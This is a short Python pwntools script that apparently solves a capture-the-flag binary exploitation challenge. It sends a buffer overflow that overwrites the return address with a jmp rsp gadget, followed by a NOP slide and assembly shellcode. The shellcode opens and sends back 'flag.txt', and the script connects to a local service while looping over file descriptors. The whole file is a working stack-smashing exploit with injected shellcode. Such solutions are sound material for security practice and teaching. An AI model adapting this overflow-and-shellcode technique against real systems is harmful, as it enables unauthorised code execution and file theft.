
from pwn import *
import time

binary_name = "./pwn"

context.arch = "amd64"
context.terminal = ['tmux','splitw','-h']

# p = gdb.debug(binary_name, """
#     #break check_pass
#     break *check_pass+243
#     break *main+42
# """)

elf = ELF(binary_name)
rop = ROP(elf)
jmp_rsp = rop.jmp_rsp.address


swbreak = b"\xcc" * 128
nopslide = b"\x90" * 128


# could have done a more elegant solution but didn't bother
for fd in range(3, 10):
    # p = process(binary_name)
    p = remote("127.0.0.1", "13372")

    shellcode = asm("""
        // int fd = openat(dp, "./flag.txt", O_RDONLY);
        mov rdi, %d
        mov rsi, %d
        xor rdx, rdx
        xor r10, r10
        mov rax, 257
        syscall
        // sendfile(1, fd, 0, 128);
        mov rdi, 1
        mov rsi, rax
        xor rdx, rdx
        mov r10, 128
        mov rax, 40
        syscall
        // exit(0)
        mov rdi, 0
        mov rax, 60
        syscall
    """ % (fd, next(elf.search(b"flag.txt"))))

    payload = b"".join([
        b"A"*32,
        b"B"*24,
        p64(jmp_rsp),
        nopslide,
        shellcode,
        # swbreak
    ])
    p.write(payload)

    resp = p.clean()

    if b"ccsc" in resp:
        print(resp.decode())
        break
    else:
        p.close()

p.interactive()
